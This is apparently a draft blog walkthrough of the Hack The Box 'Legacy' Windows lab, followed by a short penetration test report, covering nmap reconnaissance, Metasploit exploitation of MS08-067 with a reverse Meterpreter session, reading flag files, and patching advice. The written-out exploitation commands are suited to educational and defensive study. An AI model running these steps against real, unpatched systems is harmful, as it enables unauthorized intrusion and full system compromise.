---
title: Legacy HTB — Full Walkthrough
published: 2025-06-23
description: A detailed walkthrough of the Legacy HTB Windows machine, covering reconnaissance, exploitation of the MS08-067 vulnerability, post-exploitation, and flag capture.
tags: [HTB, MS08-067, Windows, SMB, Metasploit, CTF]
category: Walkthrough
draft: true
---


# Legacy HTB — Exploit MS08-067 Walkthrough

**Difficulty:** Easy

**Platform:** Hack The Box

**Target:** Windows (Legacy machine)

**Objective:** Gain administrative access using the MS08-067 vulnerability and capture the user and root flags.

## 1. Reconnaissance

Perform a full TCP port scan and version enumeration:

```bash
nmap -p- -sV -sC -Pn -T4 legacy.htb  
```

**Findings:**

- SMB services running on ports 139 and 445.
- System vulnerable to MS08-067 (CVE-2008-4250).

Add the target to `/etc/hosts`:

```bash
echo "10.10.10.4 legacy.htb" | sudo tee -a /etc/hosts  
```

## 2. Exploitation with Metasploit

Start Metasploit:

```bash
msfconsole -q  
```

Search for the MS08-067 exploit module:

```bash
search ms08_067  
```

Select and configure the exploit:

```bash
use exploit/windows/smb/ms08_067_netapi  
set RHOSTS 10.10.10.4  
set LHOST <your_ip>  
```

Execute the exploit:

```bash
run  
```

**Result:** Successful exploitation grants a Meterpreter session.

## 3. Post-Exploitation

Verify the user context in the Meterpreter session:

```bash
getuid  
```

**Output:** `NT AUTHORITY\SYSTEM`

Navigate to the user’s desktop to capture the user flag:

```bash
cd "C:\Documents and Settings\john\Desktop"  
cat user.txt  
```

Navigate to the administrator’s desktop to capture the root flag:

```bash
cd "C:\Documents and Settings\Administrator\Desktop"  
cat root.txt  
```

## 4. Additional Vulnerability

The SMB service is also vulnerable to CVE-2017-0144 (EternalBlue), which could be exploited similarly using Metasploit or other tools.

## 5. Mitigation

To prevent exploitation of MS08-067 and similar vulnerabilities:

- Apply the official Microsoft patch for MS08-067.
- Update systems to supported versions and keep them patched.
- Monitor SMB traffic and restrict external access to SMB services.

## Lessons Learned

- Unpatched systems are highly vulnerable to known exploits like MS08-067.
- Metasploit simplifies the exploitation of critical vulnerabilities.
- SMB misconfigurations can expose systems to multiple attack vectors.
- Regular patching and network monitoring are essential for security.

# Penetration Test Report

**Client:** HTB

**Engagement:** Penetration Test - Windows Legacy Machine

**Date:** June 2025

**Consultant:** Hugo Leonor

## 1. Objective

Evaluate the security of the Windows Legacy machine (`legacy.htb`), identifying vulnerabilities that could allow unauthorized access and privilege escalation, culminating in administrative access.

## 2. Scope

- **Target IP:** 10.10.10.4
- **Services:** SMB (ports 139, 445)
- **Objective:** Gain administrative access and capture flags

## 3. Methodology

The approach followed standard penetration testing stages:

- Reconnaissance using Nmap for port and vulnerability scanning
- Exploitation of identified vulnerabilities using Metasploit
- Post-exploitation to verify access level and capture flags
- Identification of additional vulnerabilities and mitigation recommendations

## 4. Summary of Findings

| Stage | Key Result | Impact |
| --- | --- | --- |
| Reconnaissance | SMB ports open, MS08-067 vulnerability identified | Exposure to remote code execution |
| Exploitation | Successful RCE via MS08-067 using Metasploit | Administrative access gained |
| Post-Exploitation | NT AUTHORITY\\SYSTEM access, user and root flags captured | Full system compromise |
| Additional Vulnerability | CVE-2017-0144 (EternalBlue) identified | Potential for alternative exploitation |

## 5. Technical Details

### 5.1 Reconnaissance

Nmap scanning revealed open SMB ports (139, 445) and confirmed the system’s vulnerability to MS08-067, a known remote code execution flaw in the Windows SMB service.

### 5.2 Exploitation

The MS08-067 vulnerability was exploited using Metasploit’s `ms08_067_netapi` module, resulting in a Meterpreter session with SYSTEM privileges.

### 5.3 Post-Exploitation

With SYSTEM access, the user and root flags were retrieved from the respective desktop directories of the `john` and `Administrator` accounts.

### 5.4 Additional Vulnerability

The system was also found vulnerable to EternalBlue (CVE-2017-0144), indicating multiple unpatched flaws in the SMB service.

## 6. Impact and Risks

- **Full System Compromise:** Administrative access allows complete control over the system.
- **Unpatched Vulnerabilities:** MS08-067 and EternalBlue are well-known exploits, easily weaponized by attackers.
- **Exposed SMB Services:** Open SMB ports increase the attack surface, especially if accessible externally.

## 7. Recommendations

- Apply Microsoft’s patches for MS08-067 and CVE-2017-0144.
- Upgrade to a supported Windows version to avoid legacy vulnerabilities.
- Restrict SMB access to trusted networks and disable unnecessary SMB services.
- Implement network monitoring to detect and block exploit attempts.
- Conduct regular vulnerability scans and patch management.